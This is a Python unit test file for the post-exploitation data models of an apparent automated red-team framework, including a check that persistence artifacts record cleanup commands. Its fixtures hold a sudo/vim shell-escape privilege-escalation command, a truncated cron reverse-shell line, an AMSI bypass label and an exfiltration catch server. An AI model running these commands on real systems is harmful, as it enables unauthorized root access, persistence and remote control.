"""Unit tests for the 8 Post-Ex (Phase 4) Pydantic models.

Covers User, Secret, Trust, PrivescCandidate, PrivescAttempt,
PersistenceArtifact, EvasionAction, ExfilEvidence.

Includes Review Focus #3 (every PersistenceArtifact must record a working
``removal_command`` so the Phase 5 Cleanup Agent can run it verbatim).
"""
import pytest
from datetime import datetime

from autored.models.postex import (
    User,
    Secret,
    Trust,
    PrivescCandidate,
    PrivescAttempt,
    PersistenceArtifact,
    EvasionAction,
    ExfilEvidence,
)


def test_user_model():
    u = User(
        host_ip="10.10.10.5",
        username="root",
        uid="0",
        groups=["root"],
        is_admin=True,
    )
    assert u.is_admin is True
    assert u.is_service_account is False


def test_secret_model():
    s = Secret(
        id="s1",
        host_ip="10.10.10.5",
        secret_type="hash",
        secret_value="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        source="/etc/shadow",
    )
    assert s.secret_type == "hash"


def test_trust_model():
    t = Trust(
        host_ip="10.10.10.5",
        trust_type="ad_domain",
        target="CORP.LOCAL",
        details={"domain": "CORP.LOCAL"},
    )
    assert t.trust_type == "ad_domain"


def test_privesc_candidate():
    c = PrivescCandidate(
        host_ip="10.10.10.5",
        technique="sudo_nopasswd",
        category="misconfig",
        details="sudo -l shows NOPASSWD for vim",
        confidence=0.95,
        exploit_command="sudo vim -c '!sh'",
        removal_command=None,
    )
    assert c.category == "misconfig"


def test_privesc_candidate_rejects_invalid_category():
    with pytest.raises(Exception):
        PrivescCandidate(
            host_ip="x",
            technique="x",
            category="invalid",
            details="x",
            confidence=0.5,
            exploit_command="x",
            removal_command=None,
        )


def test_privesc_attempt():
    a = PrivescAttempt(
        candidate_id="c1",
        host_ip="10.10.10.5",
        attempted_at=datetime.utcnow(),
        success=True,
        error=None,
        new_context="root",
    )
    assert a.success is True
    assert a.new_context == "root"


def test_persistence_artifact_records_removal():
    """Review Focus #3: every persistence artifact must have a removal_command."""
    a = PersistenceArtifact(
        id="pa1",
        host_ip="10.10.10.5",
        method="cron",
        details={"schedule": "@reboot", "command": "bash -i >& /dev/tcp/..."},
        removal_command="crontab -l | grep -v 'bash -i' | crontab -",
        created_at=datetime.utcnow(),
        foothold_id="f1",
    )
    assert a.removal_command  # must be non-empty
    assert "crontab" in a.removal_command


def test_persistence_artifact_rejects_invalid_method():
    with pytest.raises(Exception):
        PersistenceArtifact(
            id="x",
            host_ip="x",
            method="invalid_method",
            details={},
            removal_command="x",
            created_at=datetime.utcnow(),
            foothold_id="x",
        )


def test_evasion_action():
    a = EvasionAction(
        id="e1",
        host_ip="10.10.10.5",
        technique="amsi_bypass",
        target="amsi.dll",
        success=True,
        command="...",
        timestamp=datetime.utcnow(),
    )
    assert a.technique == "amsi_bypass"


def test_exfil_evidence():
    e = ExfilEvidence(
        id="ex1",
        method="https",
        source_host="10.10.10.5",
        data_size_bytes=1024,
        catch_server="http://catch.example.com",
        catch_server_log_path="/var/log/catch.log",
        timestamp=datetime.utcnow(),
    )
    assert e.method == "https"
    assert e.data_size_bytes == 1024
